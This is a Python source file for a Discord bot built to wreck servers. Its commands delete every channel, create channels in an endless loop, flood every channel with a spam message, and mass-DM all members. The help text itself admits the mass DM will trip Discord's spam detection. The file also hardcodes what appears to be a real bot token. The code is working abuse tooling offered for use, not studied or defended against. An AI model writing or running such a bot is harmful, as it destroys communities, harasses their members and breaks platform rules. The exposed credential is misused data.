from operator import mod
import re
import random
import discord
from discord import embeds
from discord import colour
from discord import user
from discord import member
from discord import permissions
from discord.colour import Color 
from discord.ext import commands
from discord.ext.commands import bot
from discord.ext.commands.bot import Bot
from discord.ext.commands.core import after_invoke, command, cooldown, has_permissions
from discord.ext.commands.errors import BotMissingPermissions, MissingPermissions, MissingRequiredArgument
from discord.member import Member
from discord.utils import time_snowflake
from discord import Intents
from discord.ext import commands

intents = discord.Intents.all()


client = commands.Bot(command_prefix = '.',intents=intents)
client.remove_command('help')
token = 'ODUwMDc2NzUzODI4MjQ5NjUw.YLkdqw.xFxLZJhcqED0qlUytLfu8MsM1Xo'

@client.command()
async def destroy (ctx,message):
    guild=ctx.message.guild
    await ctx.message.delete()
    
    for channel in list(ctx.message.guild.channels):
        try:
            await channel.delete()
            print(f"{channel.name} has been deleted")
        except:
             pass
    for i in range(1):
        await guild.create_text_channel(f"{message}")
    while True:
        for channel in guild.text_channels:
            for i in range (1):
                await guild.create_text_channel(f"{message}")
 

@client.command()
async def s(ctx, *, message ):
  guild=ctx.message.guild
  await ctx.message.delete()
  for i in range(2):
    print("spammed")
    while True:
           for channel in guild.text_channels:
                 await channel.send(f"{message}")

@client.command()
async def cda(ctx):
    guild=ctx.message.guild
    await ctx.message.delete()
    
    for channel in list(ctx.message.guild.channels):
        try:
            await channel.delete()
        except:
            pass   

@client.command()
async def dm(ctx,args=None):
    if args !=None:
      members=ctx.guild.members
      for member in members:
        try:
           await member.send(args)
           print("message sent to "+member.name)
        except:
           print("I cannot send this message to "+member.name)


@client.command()
async def commands(ctx):
 
  embed=discord.Embed(title="Commands",timestamp= ctx.message.created_at,color=discord.Color.blue(),inline=False)
  embed.add_field(name="**.cda**",value="cda command for deleting all channels only", inline=False)
  embed.add_field(name="**.destroy (message)**",value="destroy command for deleting all and creating 500 channels ",inline=False)
  embed.add_field(name="**.s (message)**",value="s command for spam the bot will send your message in all channels in the guild",inline=False)
  embed.add_field(name="**dm (message)**",value="dm command for mass dm. The bot may dm everyone, but the bot will get flaged by the discord spam system",inline=False)
  embed.set_footer(text="developed by Saad.#4707")

  await ctx.send(embed=embed)


client.run(token)
